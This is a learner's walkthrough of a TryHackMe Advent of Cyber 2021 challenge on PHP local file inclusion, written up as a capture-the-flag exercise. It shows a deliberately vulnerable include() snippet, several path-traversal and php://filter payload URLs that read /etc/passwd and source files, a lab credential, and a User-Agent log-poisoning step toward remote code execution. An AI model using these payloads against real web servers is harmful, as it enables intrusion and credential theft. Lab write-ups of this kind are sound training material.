---
id: Advent of Cyber 2021 Day 6
title: Day 6
---

import BrowserWindow from '@site/src/components/BrowserWindow'; 

export const Highlight = ({children, color}) => (
  <span
    style={{
      backgroundColor: color,
      borderRadius: '2px',
      color: '#fff',
      padding: '0.2rem',
    }}>
    {children}
  </span>
);

:::note Advent of Cyber 2021
Here is a direct [link](https://tryhackme.com/room/adventofcyber3) to the Advent of Cyber 2021.
:::

:::caution General Rules
- *.tryhackme.com and the OpenVPN server is off-limits to probing, scanning, or exploiting.
- Users are only authorized to hack machines that have been deployed in the rooms they have access to.
- Users are not to target or attack other users
- Users should only enter the event once, using one account.
:::

## [Day 6] <Highlight color="#621d27">Web Exploitation</Highlight> Patch Management Is Hard 

>During a routine security audit before the Incident, McSkidy discovered some recovery passwords on an old server. She created a ticket to decommission this server to reduce this security vulnerability. The Elf assigned to fix this vulnerability kept pushing off the task, and this never got done. Luckily, some of those recovery keys can be used to save some systems.

>Unfortunately, the only way to access the server is through an old web application. See if you can pull out those recovery keys to help McSkidy with her pursuit to save Christmas.

### Local File Inclusion (LFI) vulnerability
LFI is a vuln in web applications. In PHP, some functions could cause these vulns. 

- `include`
- `require`
- `include_once` 
- `require_once`

For example, these functions could be used by a bad actor to include confidential files. Improper input validation could lead to such issues. 

```
<?PHP 
	include($_GET["file"]);
?>
```

A sample demonstration of guessing an exploit

An LFI exploit could also be chained with RCE. 

`http://example.thm.labs/index.php?file=welcome.txt`
Demonstration of HTTP request

In File Inclusion, we are trying to enter directories that we normally shouldnt have access to.

Some Additional examples (some are escaping, or attempting to escape dirs):
<BrowserWindow url="http://localhost:3000">

```http title="Sample HTTP requests"
http://example.thm.labs/page.php?file=/etc/passwd http://example.thm.labs/page.php?file=../../../../../../etc/passwd 
http://example.thm.labs/page.php?file=../../../../../../etc/passwd%00 
http://example.thm.labs/page.php?file=....//....//....//....//etc/passwd 
http://example.thm.labs/page.php?file=%252e%252e%252fetc%252fpasswd
```

</BrowserWindow>

Here the machine challenge is simpler. However, note that there is no protection:
http://MACHINE_IP/index.php?err=/etc/flag

![initialLFI.png](/img/_resources/Day_6/initialLFI.png)


Trying to apply the php filter technique


http://MACHINE_IP/index.php?err=php://filter/convert.base64-encode/resource=index.php

The earlier proof of concept explained how we notice errors such as this
![errors.png](/img/_resources/Day_6/errors.png)
Because the server is attempting to execute the php code. So instead, we bypass this by encoding the returned page instead, so that we can view the pages. 

Now that we have decoded the page content, we see an interesting manage.php file
![base64encode.png](/img/_resources/Day_6/base64encode.png)


Okay, now there's this stuff...
![morebase64.png](/img/_resources/Day_6/morebase64.png)

Notice this in the passwordrecovery file
![handy.png](/img/_resources/Day_6/handy.png)
(This will be for server details when we execute our php filter)
<br />
![includes.png](/img/_resources/Day_6/includes.png)<br />
(This will provide login credentials as shown in the next photo)

![logininfo.png](/img/_resources/Day_6/logininfo.png)<br />
McSkidy:A0C315Aw3s0m


In this demonstration, we can now view the log and see how it logs user requests'. We will attempt to add our RCE injection in User-Agent so that the server will automatically execute. 

<BrowserWindow url="http://localhost:3000">

```bash
curl -A "This is testing" http://MACHINE_IP.p.thmlabs.com/login.php
```
</BrowserWindow>

![login.png](/img/_resources/Day_6/logininfo.png)<br />
Through this simple command we note there are 0 filterings allowing such a command to execute to execute RCE. 

http://MACHINE_IP/index.php?err=./includes/logs/app_access.log
If you access the page on a signed out user, you can now see your injection and its fruits

And that's the name of the hostname
![sysinfo.png](/img/_resources/Day_6/sysinfo.png)

### SideNote
*By far the hardest day so far, also had to check the walktrhough to better understand what was going on as well as to just understand the steps*